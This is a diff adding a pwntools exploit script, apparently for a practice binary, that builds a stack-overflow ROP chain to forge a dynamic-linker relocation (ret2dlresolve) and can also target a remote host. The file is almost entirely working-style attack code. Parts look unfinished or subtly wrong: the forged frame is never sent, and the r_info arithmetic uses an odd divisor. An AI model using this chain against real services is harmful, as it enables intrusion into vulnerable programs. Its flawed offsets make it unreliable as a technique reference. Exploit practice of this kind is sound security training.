@@ -1,0 +1,91 @@
+#!/usr/bin/env python3
+from pwn import *
+
+
+fname = 'resolve_partial_relro'
+ip = '0.0.0.0'
+port = 5000 #change this
+context.binary = elf = ELF('resolve_partial_relro')
+
+
+
+
+LOCAL = True
+
+if LOCAL:
+    r = process(fname,aslr=True)
+
+    gdbscript="""
+    b *main
+    b *0x00000000004011c8
+
+    """
+    #set follow-fork-mode
+
+    attach('resolve_partial_relro',gdbscript=gdbscript)
+else:
+    r = remote(ip, port)
+
+s = lambda x : r.send(x)
+rl = lambda : r.recvline()
+rlb = lambda : r.recvlineb()
+sl = lambda x : r.sendline(x)
+ru = lambda x :r.recvuntil(x)
+rcb = lambda x :r.recvb(x)
+sla = lambda x,y : r.sendlineafter(x,y)
+inter = lambda : r.interactive()
+
+
+def pwn():
+
+
+	pop_rdi		= 0x401263
+	pop_rsi_r15	= 0x401261
+	pop_rdx		= 0x4011d1
+	read = elf.plt['read']
+	dl_resolve = 0x401020
+	dynsym = 0x4003c8
+	dynstr = 0x400471
+	rel_plt = 0x400550
+	fake_frame_addr = 0x404060+24
+
+	dl_resolve_index = int((fake_frame_addr - rel_plt) / 24)
+	print(dl_resolve_index)
+
+	r_info = int(((fake_frame_addr + 24) - dynsym)/18)
+	print(r_info)
+
+	#frame will be written to fake_frame_addr
+	fake_frame = b''
+	fake_frame += p64(0x404018)			#GOT addr where to resolve
+	fake_frame += p32(0x7)
+	fake_frame += p32(r_info)			#r_info
+	fake_frame += p64(0x00)
+
+	len_fake_frame = len(fake_frame)
+
+
+	payload = b''
+	payload += b'A'*24				#pad
+	payload += p64(pop_rdi)
+	payload += p64(0x00)			#read from stdin
+	payload += p64(pop_rsi_r15)
+	payload += p64(fake_frame_addr)		#.bss addr
+	payload += p64(0x00)			#junk r15
+	payload += p64(pop_rdx)
+	payload += p64(len_fake_frame)
+	payload += p64(read)
+	payload += p64(pop_rdi)
+	payload += p64(0x400000)			#argument for the fake function we will resolve
+	payload += p64(dl_resolve)
+	payload += p64(dl_resolve_index)
+
+	s(payload)
+	# pause(5)
+	#s(fake_frame)
+
+if __name__ == '__main__':
+    pwn()
+
+
+
